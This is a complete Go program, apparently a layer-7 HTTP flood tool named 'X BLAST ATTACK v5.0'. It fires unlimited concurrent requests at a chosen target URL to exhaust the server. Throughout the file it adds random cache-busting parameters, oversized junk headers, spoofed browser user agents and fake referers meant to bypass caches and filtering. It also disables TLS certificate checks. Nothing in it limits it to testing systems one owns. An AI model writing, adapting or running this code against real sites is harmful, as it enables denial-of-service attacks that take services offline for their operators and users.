package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

type AttackConfig struct {
	TargetURL  string
	Threads    int
	Duration   int
	UserAgents []string
	BlastMode  bool
}

type AttackStats struct {
	SuccessCount int64
	ErrorCount   int64
	TotalBytes   int64
	StartTime    time.Time
	RequestCount int64
}

var (
	stats      AttackStats
	httpClient *http.Client
	stopChan   chan struct{}
)

func init() {
	// ULTRA HEAVY CIPHER SUITES - Maximum CPU load
	cipherSuites := []uint16{
		tls.TLS_AES_256_GCM_SHA384,
		tls.TLS_CHACHA20_POLY1305_SHA256,
		tls.TLS_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
		tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
	}

	httpClient = &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				CipherSuites:       cipherSuites,
				CurvePreferences: []tls.CurveID{
					tls.CurveP521,
					tls.CurveP384,
					tls.X25519,
					tls.CurveP256,
				},
			},
			DisableKeepAlives:   false,
			MaxIdleConns:        0,
			MaxIdleConnsPerHost: 100000,
			MaxConnsPerHost:     0,
		},
		Timeout: 0,
	}

	stopChan = make(chan struct{})
}

func main() {
	target := flag.String("target", "", "Target URL (required)")
	threads := flag.Int("threads", 1000, "Number of concurrent threads")
	duration := flag.Int("duration", 0, "Attack duration in seconds (0 = unlimited)")

	flag.Parse()

	if *target == "" {
		printUsage()
		os.Exit(1)
	}

	config := &AttackConfig{
		TargetURL: *target,
		Threads:   *threads,
		Duration:  *duration,
		BlastMode: true,
	}

	initUserAgents(config)
	setupSignalHandler()
	printBanner(config)

	stats.StartTime = time.Now()
	startBlastAttack(config)
}

func printUsage() {
	fmt.Println("X BLAST ATTACK v5.0 - ULTIMATE HEADER OVERLOAD")
	fmt.Println("Usage: ./blast_max -target https://example.com [options]")
	fmt.Println("\nOptions:")
	flag.PrintDefaults()
	fmt.Println("\nFeatures:")
	fmt.Println("  💥 Full Heavy Headers - Maximum request size")
	fmt.Println("  🔥 Ultimate Cache Busting - Bypass all caching")
	fmt.Println("  🚀 Never Stops - Continuous attack mode")
	fmt.Println("\nExample:")
	fmt.Println("  ./blast_max -target https://example.com -threads 10000")
}

func printBanner(config *AttackConfig) {
	fmt.Println("\n" + strings.Repeat("═", 70))
	fmt.Println("        X BLAST ATTACK v5.0 - ULTIMATE HEADER OVERLOAD")
	fmt.Println("              FULL HEAVY HEADERS + MAX CACHE BUSTING")
	fmt.Println(strings.Repeat("═", 70))
	fmt.Printf("🎯 Target:     %s\n", config.TargetURL)
	fmt.Printf("🚀 Threads:    %d\n", config.Threads)
	fmt.Printf("💥 Headers:    ULTRA HEAVY PAYLOAD\n")
	fmt.Printf("🔥 Cache Bust: MAXIMUM OVERLOAD\n")
	fmt.Printf("⚡ Blast Mode: PERMANENTLY ACTIVE\n")
	fmt.Println("\n🟢 Status:     LAUNCHING ULTIMATE BLAST ATTACK...")
	fmt.Println(strings.Repeat("═", 70))
}

func initUserAgents(config *AttackConfig) {
	config.UserAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
	}
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func generateHeavyCacheBuster() string {
	// ULTIMATE CACHE BUSTING - Multiple parameters with heavy payloads
	cacheBusters := []string{
		fmt.Sprintf("_rnd=%d", rand.Int63()),
		fmt.Sprintf("_timestamp=%d", time.Now().UnixNano()),
		fmt.Sprintf("_cachebust=%s", randomString(32)),
		fmt.Sprintf("_version=%d", rand.Intn(99999)),
		fmt.Sprintf("_random=%s", randomString(16)),
		fmt.Sprintf("_session=%s", randomString(24)),
		fmt.Sprintf("_token=%s", randomString(40)),
		fmt.Sprintf("_nonce=%s", randomString(20)),
		fmt.Sprintf("_salt=%s", randomString(16)),
		fmt.Sprintf("_hash=%x", rand.Uint64()),
		fmt.Sprintf("_uuid=%s-%s-%s-%s-%s", 
			randomString(8), randomString(4), randomString(4), randomString(4), randomString(12)),
		fmt.Sprintf("_entropy=%s", randomString(64)),
		fmt.Sprintf("_fingerprint=%s", randomString(32)),
		fmt.Sprintf("_signature=%s", randomString(48)),
		fmt.Sprintf("_checksum=%x", rand.Uint32()),
	}
	
	return strings.Join(cacheBusters, "&")
}

func startBlastAttack(config *AttackConfig) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	// Launch all attack threads with MAX RATE MODE
	for i := 0; i < config.Threads; i++ {
		go blastWorker(config)
	}

	// Duration timer (optional)
	if config.Duration > 0 {
		go func() {
			time.Sleep(time.Duration(config.Duration) * time.Second)
			fmt.Println("\n\n⏱️  Attack duration completed. Stopping...")
			close(stopChan)
		}()
	}

	// Statistics printer
	go printStats()

	fmt.Println("\n✅ All threads launched. BLAST ATTACK WITH HEAVY HEADERS ACTIVE!")
	fmt.Println("💥 Press Ctrl+C to stop the attack\n")

	// Wait for stop signal
	<-stopChan
	printFinalStats()
	os.Exit(0)
}

func blastWorker(config *AttackConfig) {
	errorStreak := 0
	
	for {
		select {
		case <-stopChan:
			return
		default:
			success := fireBlastRequest(config)
			atomic.AddInt64(&stats.RequestCount, 1)
			
			if !success {
				errorStreak++
			} else {
				errorStreak = 0
			}
		}
	}
}

func fireBlastRequest(config *AttackConfig) bool {
	url := buildBlastURL(config.TargetURL)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		atomic.AddInt64(&stats.ErrorCount, 1)
		return false
	}

	// ULTRA HEAVY HEADERS
	randomizeUltraHeavyHeaders(req, config)

	resp, err := httpClient.Do(req)
	if err != nil {
		atomic.AddInt64(&stats.ErrorCount, 1)
		return false
	}

	if resp.Body != nil {
		n, _ := io.Copy(io.Discard, resp.Body)
		atomic.AddInt64(&stats.TotalBytes, n)
		resp.Body.Close()
	}

	atomic.AddInt64(&stats.SuccessCount, 1)
	return true
}

func buildBlastURL(baseURL string) string {
	separator := "?"
	if strings.Contains(baseURL, "?") {
		separator = "&"
	}

	// ULTIMATE CACHE BUSTING
	heavyCacheBuster := generateHeavyCacheBuster()
	
	return baseURL + separator + heavyCacheBuster
}

func randomizeUltraHeavyHeaders(req *http.Request, config *AttackConfig) {
	// === BASIC HEADERS ===
	req.Header.Set("User-Agent", config.UserAgents[rand.Intn(len(config.UserAgents))])
	
	// === ACCEPT HEADERS - MAXIMUM VARIETY ===
	acceptTypes := []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
	}
	req.Header.Set("Accept", acceptTypes[rand.Intn(len(acceptTypes))])
	
	// === LANGUAGE HEADERS - FULL INTERNATIONAL SUPPORT ===
	languages := []string{
		"en-US,en;q=0.9,id;q=0.8,zh-CN;q=0.7,zh;q=0.6,ja;q=0.5,ko;q=0.4,th;q=0.3,vi;q=0.2",
		"en-GB,en;q=0.9,en-US;q=0.8,id;q=0.7,ms;q=0.6,zh-Hans;q=0.5,zh;q=0.4",
		"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms-MY;q=0.6,ms;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,it;q=0.5,pt;q=0.4,ru;q=0.3,ar;q=0.2",
	}
	req.Header.Set("Accept-Language", languages[rand.Intn(len(languages))])
	
	// === ENCODING HEADERS ===
	req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
	
	// === CONNECTION & PERFORMANCE HEADERS ===
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Keep-Alive", "timeout=60, max=1000")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	
	// === CACHE CONTROL - FORCE NO CACHE ===
	cacheControls := []string{
		"no-cache, no-store, must-revalidate, proxy-revalidate, max-age=0, s-maxage=0",
		"no-cache, no-store, must-revalidate, max-age=0, post-check=0, pre-check=0",
		"private, no-cache, no-store, max-age=0, must-revalidate",
		"no-cache, max-age=0, must-revalidate, no-store, private",
	}
	req.Header.Set("Cache-Control", cacheControls[rand.Intn(len(cacheControls))])
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Expires", "0")
	
	// === SECURITY HEADERS ===
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Sec-CH-UA", `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`)
	req.Header.Set("Sec-CH-UA-Mobile", "?0")
	req.Header.Set("Sec-CH-UA-Platform", "\"Windows\"")
	
	// === HEAVY CUSTOM HEADERS - EXHAUST SERVER ===
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("X-CSRF-Token", randomString(32))
	req.Header.Set("X-Request-ID", randomString(36))
	req.Header.Set("X-Session-ID", randomString(32))
	req.Header.Set("X-Client-Data", randomString(128))
	req.Header.Set("X-Device-ID", randomString(40))
	req.Header.Set("X-App-Version", fmt.Sprintf("%d.%d.%d", rand.Intn(10), rand.Intn(100), rand.Intn(1000)))
	req.Header.Set("X-Build-Number", fmt.Sprintf("%d", rand.Intn(99999)))
	req.Header.Set("X-Client-Version", randomString(16))
	req.Header.Set("X-Platform", "web")
	req.Header.Set("X-Timestamp", fmt.Sprintf("%d", time.Now().UnixNano()))
	req.Header.Set("X-Nonce", randomString(24))
	req.Header.Set("X-Hash", fmt.Sprintf("%x", rand.Uint64()))
	req.Header.Set("X-Signature", randomString(64))
	req.Header.Set("X-Checksum", fmt.Sprintf("%x", rand.Uint32()))
	
	// === BROWSER SPECIFIC HEADERS ===
	req.Header.Set("DNT", "1")
	req.Header.Set("Viewport-Width", fmt.Sprintf("%d", 1920+rand.Intn(400)))
	req.Header.Set("Device-Memory", fmt.Sprintf("%d", 4+rand.Intn(28)))
	req.Header.Set("Downlink", fmt.Sprintf("%.1f", float64(rand.Intn(100))/10.0))
	req.Header.Set("ECT", "4g")
	req.Header.Set("RTT", fmt.Sprintf("%d", 50+rand.Intn(200)))
	req.Header.Set("Save-Data", "off")
	
	// === ADDITIONAL HEAVY HEADERS ===
	req.Header.Set("X-Frame-Options", "SAMEORIGIN")
	req.Header.Set("X-Content-Type-Options", "nosniff")
	req.Header.Set("X-XSS-Protection", "1; mode=block")
	req.Header.Set("Referrer-Policy", "strict-origin-when-cross-origin")
	req.Header.Set("Content-Security-Policy", "default-src 'self'")
	
	// === PERFORMANCE HEADERS ===
	req.Header.Set("Priority", "u=0, i")
	req.Header.Set("Purpose", "prefetch")
	req.Header.Set("X-Purpose", "preview")
	
	// === ANALYTICS & TRACKING HEADERS ===
	req.Header.Set("X-Analytics-ID", randomString(20))
	req.Header.Set("X-Tracking-ID", fmt.Sprintf("GA%d.%d.%d", rand.Intn(10), rand.Intn(1000000000), rand.Intn(1000000000)))
	req.Header.Set("X-Session-Time", fmt.Sprintf("%d", rand.Intn(86400)))
	req.Header.Set("X-Page-Load-Time", fmt.Sprintf("%d", rand.Intn(5000)))
	
	// === RANDOM REFERER (OPTIONAL) ===
	if rand.Intn(10) > 3 {
		referers := []string{
			"https://www.google.com/search?q=" + randomString(10),
			"https://www.bing.com/search?q=" + randomString(8),
			"https://duckduckgo.com/?q=" + randomString(12),
			"https://www.youtube.com/",
			"https://www.facebook.com/",
			"https://twitter.com/",
			"https://www.linkedin.com/",
			"https://github.com/",
		}
		req.Header.Set("Referer", referers[rand.Intn(len(referers))])
	}
	
	// === ULTRA HEAVY PAYLOAD HEADERS ===
	req.Header.Set("X-Heavy-Payload-1", randomString(256))
	req.Header.Set("X-Heavy-Payload-2", randomString(512))
	req.Header.Set("X-Heavy-Payload-3", randomString(128))
}

func printStats() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-stopChan:
			return
		case <-ticker.C:
			success := atomic.LoadInt64(&stats.SuccessCount)
			errors := atomic.LoadInt64(&stats.ErrorCount)
			bytes := atomic.LoadInt64(&stats.TotalBytes)
			requests := atomic.LoadInt64(&stats.RequestCount)
			duration := time.Since(stats.StartTime)
			rps := float64(success) / duration.Seconds()
			
			successRate := 0.0
			if requests > 0 {
				successRate = float64(success) / float64(requests) * 100
			}
			
			fmt.Printf("\r🔥 RPS: %.0f | ✅: %d | ❌: %d | 📊: %.1f MB | 🎯: %.1f%% | ⏱️: %.0fs | 💥: HEAVY HEADERS",
				rps, success, errors, float64(bytes)/(1024*1024), successRate, duration.Seconds())
		}
	}
}

func printFinalStats() {
	duration := time.Since(stats.StartTime)
	success := atomic.LoadInt64(&stats.SuccessCount)
	errors := atomic.LoadInt64(&stats.ErrorCount)
	requests := atomic.LoadInt64(&stats.RequestCount)
	bytes := atomic.LoadInt64(&stats.TotalBytes)
	
	rps := float64(success) / duration.Seconds()
	successRate := 0.0
	if requests > 0 {
		successRate = float64(success) / float64(requests) * 100
	}

	fmt.Printf("\n\n" + strings.Repeat("═", 70) + "\n")
	fmt.Println("          BLAST ATTACK COMPLETED - HEAVY HEADERS MODE")
	fmt.Println(strings.Repeat("═", 70))
	fmt.Printf("✅ Successful Requests:  %d\n", success)
	fmt.Printf("❌ Failed Requests:      %d\n", errors)
	fmt.Printf("📊 Total Requests:       %d\n", requests)
	fmt.Printf("🎯 Success Rate:         %.1f%%\n", successRate)
	fmt.Printf("📦 Data Transferred:     %.1f MB\n", float64(bytes)/(1024*1024))
	fmt.Printf("⏱️  Duration:             %.1f seconds\n", duration.Seconds())
	fmt.Printf("🚀 Average RPS:          %.0f req/s\n", rps)
	fmt.Printf("💥 Header Mode:          ULTRA HEAVY COMPLETED\n")
	fmt.Printf("🔥 Cache Busting:        MAXIMUM OVERLOAD\n")
	fmt.Println(strings.Repeat("═", 70))
}

func setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c
		fmt.Println("\n\n🛑 BLAST ATTACK HEAVY HEADERS stopped by user")
		close(stopChan)
	}()
}
